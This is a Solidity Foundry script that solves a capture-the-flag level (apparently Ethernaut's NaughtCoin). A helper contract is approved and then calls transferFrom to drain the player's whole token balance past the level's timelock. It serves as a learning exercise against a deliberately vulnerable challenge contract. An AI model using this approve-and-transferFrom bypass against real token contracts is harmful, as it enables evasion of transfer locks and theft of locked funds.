// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level15.sol";
import "forge-std/Test.sol";

contract ExploitLevel15 is Test {
    NaughtCoin instance = NaughtCoin(0x46a0b1BA3425e277c27851a6E575bBB0669eE21b);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function run() external {
        uint256 initialBalance = instance.balanceOf(player);
        console.log("Player's balance before:", initialBalance);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackNaughtCoin attackNC = new AttackNaughtCoin(instance);
        instance.approve(address(attackNC), initialBalance);
        attackNC.transfer(initialBalance);
        vm.stopBroadcast();

        console.log("Player's balance after:", instance.balanceOf(player));
    }
}

contract AttackNaughtCoin {
    NaughtCoin instance;
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    constructor(NaughtCoin _instance) {
        instance = _instance;
    }

    function transfer(uint256 _amount) external {
        instance.transferFrom(player, address(this), _amount);
    }
}
